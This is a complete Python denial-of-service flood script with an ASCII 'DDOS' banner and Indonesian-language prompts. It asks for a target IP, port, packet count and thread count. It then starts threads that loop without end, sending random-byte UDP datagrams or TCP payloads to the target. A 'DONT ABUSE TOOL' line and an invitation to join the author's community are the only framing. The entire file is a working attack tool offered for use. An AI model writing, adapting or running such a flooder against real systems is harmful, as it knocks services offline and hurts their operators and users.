#!/usr/bin/env python3
import random
import socket
import threading

print("""
  ____  ____   ___  ____  
 |  _ \|  _ \ / _ \/ ___| 
 | | | | | | | | | \___ \ 
 | |_| | |_| | |_| |___) |
 |____/|____/ \___/|____/ 
                          """)
print("DONT ABUSE TOOL")
print("KALO MAU REMAKE PM GUA")
print("JOIN MY COMUNNITY")
print("LINK COMUNNITY? PM GUA")
ip = str(input(" IP TARGET:"))
port = int(input(" PORT:"))
choice = str(input(" GAS DDOS?(y/n):"))
times = int(input(" Packet:"))
threads = int(input(" Isi Packet:"))
def run():
    data = random._urandom(1025)
    i = random.choice(("[×]","[×]","[×]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" PERMISI PAKET!!!")
        except:
            print("[!] DOWN KAH?!!!")

def run2():
    data = random._urandom(16)
    i = random.choice(("[×]","[×]","[×]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" PERMISI PAKET!!!")
        except:
            s.close()
            print("[!] DOWN KAH?!!!")
        
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()